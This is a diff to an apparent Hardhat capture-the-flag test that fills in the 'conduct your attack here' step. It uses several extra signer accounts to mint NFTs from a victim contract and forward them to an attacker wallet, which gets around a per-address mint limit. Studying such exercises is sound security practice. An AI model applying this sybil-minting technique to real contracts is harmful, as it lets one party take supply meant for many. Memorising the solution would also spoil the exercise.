@@ -26,6 +26,13 @@ describe(NAME, function () {
 
         it("conduct your attack here", async function () {
 
+            const [, , ...signers] = await ethers.getSigners();
+
+            for(let i =0; i<4; i++){
+                await victimContract.connect(signers[i]).mint();
+                await victimContract.connect(signers[i]).transferFrom(signers[i].address,attackerWallet.address,i+1);
+            }
+            await victimContract.connect(attackerWallet).mint();
         });
 
         after(async function () {
